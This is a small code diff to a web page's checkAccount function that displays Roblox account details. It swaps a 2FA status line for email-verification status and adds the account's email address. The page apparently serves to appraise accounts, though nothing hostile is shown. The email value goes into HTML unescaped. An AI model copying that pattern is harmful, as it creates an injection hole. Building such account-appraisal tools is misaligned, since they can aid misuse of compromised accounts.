@@ -84,9 +84,10 @@ async function checkAccount() {
         <b>User ID:</b> ${json.userId}<br>
         <b>Roblox Premium:</b> <span style="color: ${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">${json.hasPremium ? 'YES ✓' : 'NO ✗'}</span><br>
         
-        <b>2-Step Verification (2FA):</b> <span style="color: ${json.has2FA ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">
-          ${json.has2FA ? 'ENABLED ✓' : 'DISABLED ✗'}
+        <b>Email Verified:</b> <span style="color: ${json.emailVerified ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">
+          ${json.emailVerified ? 'YES ✓' : 'NO ✗'}
         </span><br>
+        ${json.emailAddress ? `<b>Email:</b> ${json.emailAddress}<br>` : ''}
         
         <b>Robux Balance:</b> <span style="color: #ffcc00; font-weight: bold;">${json.robux.toLocaleString('en-US')} Robux</span><br>
         
